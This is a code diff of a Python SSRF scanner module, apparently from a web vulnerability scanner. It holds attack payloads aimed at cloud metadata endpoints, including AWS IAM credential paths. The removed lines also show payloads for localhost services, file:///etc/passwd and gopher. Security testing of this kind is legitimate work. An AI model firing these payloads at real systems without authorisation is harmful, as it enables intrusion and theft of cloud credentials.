@@ -1,144 +1,120 @@
 """
-SSRF (Server-Side Request Forgery) Scanner Module
-Tests for SSRF vulnerabilities including cloud metadata access
+Advanced SSRF Scanner Module
+Google-level SSRF detection with cloud metadata validation
 """
 
 import re
-from typing import List, Dict
+from typing import List, Dict, Optional
+from .validation_engine import AdvancedValidator
 
 class SSRFScanner:
-    """Smart SSRF vulnerability scanner"""
+    """
+    Enterprise-grade SSRF vulnerability scanner
+    Cloud metadata testing with multi-stage validation
+    """
 
     def __init__(self, parent_scanner):
         self.scanner = parent_scanner
-        self.name = "SSRF Scanner"
+        self.name = "SSRF Scanner (Advanced)"
+        self.validator = AdvancedValidator(parent_scanner)
         self.payloads = self.generate_ssrf_payloads()
 
     def generate_ssrf_payloads(self) -> List[Dict]:
-        """Generate SSRF test payloads"""
+        """Generate high-confidence SSRF test payloads"""
         payloads = [
-            # Cloud metadata endpoints
+            # AWS metadata endpoints (CRITICAL findings)
             {
-                'payload': 'http://169.254.169.254/latest/meta-data/',
+                'payload': 'http://169.254.169.254/latest/meta-data/ami-id',
                 'type': 'AWS Metadata',
-                'evidence': ['ami-id', 'instance-id', 'public-hostname', 'iam/']
+                'evidence': [r'ami-[a-z0-9]{8,}'],
+                'severity': 'CRITICAL'
             },
             {
-                'payload': 'http://metadata.google.internal/computeMetadata/v1/',
+                'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+                'type': 'AWS IAM Credentials',
+                'evidence': ['iam/security-credentials', 'AssumeRole'],
+                'severity': 'CRITICAL'
+            },
+
+            # GCP metadata endpoints
+            {
+                'payload': 'http://metadata.google.internal/computeMetadata/v1/instance/id',
                 'type': 'GCP Metadata',
-                'evidence': ['project/', 'instance/', 'numeric_project_id']
+                'evidence': [r'\d{15,20}'],  # GCP instance IDs are long numbers
+                'severity': 'CRITICAL',
+                'headers': {'Metadata-Flavor': 'Google'}
             },
+
+            # Azure metadata endpoints
             {
-                'payload': 'http://169.254.169.254/metadata/v1/',
+                'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                 'type': 'Azure Metadata',
-                'evidence': ['instance', 'network', 'compute']
-            },
-
-            # Internal network probing
-            {
-                'payload': 'http://localhost/',
-                'type': 'Localhost Access',
-                'evidence': ['127.0.0.1', 'localhost']
-            },
-            {
-                'payload': 'http://127.0.0.1/',
-                'type': 'Localhost Access',
-                'evidence': ['apache', 'nginx', 'index of', 'welcome']
-            },
-            {
-                'payload': 'http://0.0.0.0/',
-                'type': 'Localhost Access',
-                'evidence': ['server', 'index']
-            },
-
-            # Internal services
-            {
-                'payload': 'http://localhost:22',
-                'type': 'Internal SSH',
-                'evidence': ['SSH', 'OpenSSH']
-            },
-            {
-                'payload': 'http://localhost:3306',
-                'type': 'Internal MySQL',
-                'evidence': ['mysql', 'mariadb']
-            },
-            {
-                'payload': 'http://localhost:5432',
-                'type': 'Internal PostgreSQL',
-                'evidence': ['postgres', 'psql']
-            },
-            {
-                'payload': 'http://localhost:6379',
-                'type': 'Internal Redis',
-                'evidence': ['redis', 'REDIS']
-            },
-            {
-                'payload': 'http://localhost:9200',
-                'type': 'Internal Elasticsearch',
-                'evidence': ['elasticsearch', 'cluster_name']
-            },
-
-            # File protocol
-            {
-                'payload': 'file:///etc/passwd',
-                'type': 'Local File Access',
-                'evidence': ['root:x:0:0', '/bin/bash', '/sbin/nologin']
-            },
-
-            # Protocol bypass
-            {
-                'payload': 'gopher://localhost:25/_MAIL',
-                'type': 'Gopher Protocol',
-                'evidence': ['SMTP', '220']
+                'evidence': ['subscriptionId', 'vmId', 'resourceGroupName'],
+                'severity': 'CRITICAL',
+                'headers': {'Metadata': 'true'}
             },
         ]
 
         return payloads
 
-    def check_ssrf_indicators(self, response, payload_dict: Dict) -> bool:
-        """Check if response indicates successful SSRF"""
-        if not response or not response.text:
-            return False
-
-        evidence_keywords = payload_dict['evidence']
-
-        # Check for evidence keywords in response
-        for keyword in evidence_keywords:
-            if keyword.lower() in response.text.lower():
-                return True
-
-        # Check for specific response characteristics
-        if 'metadata' in payload_dict['payload'].lower():
-            # Cloud metadata often returns plain text or specific formats
-            if len(response.text) > 0 and len(response.text) < 10000:
-                return True
-
-        return False
-
     def test_parameter(self, url: str, param: str, value: str) -> List[Dict]:
-        """Test a single parameter for SSRF"""
+        """Test parameter for SSRF with advanced validation"""
         vulnerabilities = []
 
-        for payload_dict in self.payloads[:10]:  # Limit to avoid too many requests
+        print(f"  [*] Testing parameter: {param}")
+
+        # First, check if parameter accepts URLs
+        test_url = "http://example.com/test.html"
+        test_resp = self.scanner.smart_request(url, params={param: test_url})
+
+        if not test_resp:
+            print(f"    [-] Parameter not responsive")
+            return vulnerabilities
+
+        # Test each SSRF payload
+        for payload_dict in self.payloads:
+            print(f"    [*] Testing: {payload_dict['type']}...")
+
+            # Prepare headers if needed
+            headers = payload_dict.get('headers', {})
+            if headers:
+                old_headers = self.scanner.session.headers.copy()
+                self.scanner.session.headers.update(headers)
+
             test_resp = self.scanner.smart_request(
                 url,
                 params={param: payload_dict['payload']},
                 timeout=15
             )
 
-            if test_resp and self.check_ssrf_indicators(test_resp, payload_dict):
-                severity = 'CRITICAL' if 'metadata' in payload_dict['type'].lower() else 'HIGH'
+            # Restore headers
+            if headers:
+                self.scanner.session.headers = old_headers
 
+            if not test_resp:
+                continue
+
+            # Validate with advanced validator
+            validation = self.validator.validate_ssrf(
+                url, param, payload_dict['payload'],
+                test_resp, payload_dict['type']
+            )
+
+            if validation.is_valid:
+                print(f"    [+] Confirmed SSRF - {payload_dict['type']} (confidence: {validation.confidence:.2%})")
                 vulnerabilities.append({
                     'type': f'Server-Side Request Forgery (SSRF) - {payload_dict["type"]}',
-                    'severity': severity,
+                    'severity': payload_dict['severity'],
+                    'confidence': validation.confidence,
                     'url': url,
                     'parameter': param,
                     'payload': payload_dict['payload'],
-                    'description': f'SSRF vulnerability allowing {payload_dict["type"]} access via parameter "{param}"',
-                    'evidence': test_resp.text[:500]
+                    'description': f'Confirmed SSRF allowing {payload_dict["type"]} access via parameter "{param}"',
+                    'evidence': ' | '.join(validation.evidence),
+                    'validation': 'Multi-stage cloud metadata validated - CONFIRMED',
+                    'impact': 'Can access cloud provider metadata and potentially steal credentials'
                 })
-                break  # Found SSRF, stop testing this parameter
+                return vulnerabilities  # Stop after finding SSRF
 
         return vulnerabilities
 
@@ -153,19 +129,25 @@ class SSRFScanner:
 
         if not params:
             # Try common SSRF parameters
-            test_params = ['url', 'uri', 'path', 'dest', 'redirect', 'download', 'fetch',
-                          'file', 'src', 'source', 'target', 'link', 'image']
+            print("  [*] No URL parameters found, testing common parameter names...")
+            test_params = ['url', 'uri', 'path', 'dest', 'destination', 'redirect',
+                          'download', 'fetch', 'file', 'src', 'source', 'target',
+                          'link', 'image', 'img', 'proxy', 'api']
             for param in test_params:
                 test_url = f"{self.scanner.target}?{param}=http://example.com"
                 resp = self.scanner.smart_request(test_url)
                 if resp and resp.status_code == 200:
                     vulns = self.test_parameter(self.scanner.target, param, 'http://example.com')
                     vulnerabilities.extend(vulns)
+                    if vulns:
+                        break  # Found SSRF, stop
         else:
             # Test existing parameters
             for param, values in params.items():
                 value = values[0] if values else 'http://example.com'
                 vulns = self.test_parameter(self.scanner.target, param, value)
                 vulnerabilities.extend(vulns)
+                if vulns:
+                    break  # Found SSRF, stop
 
         return vulnerabilities
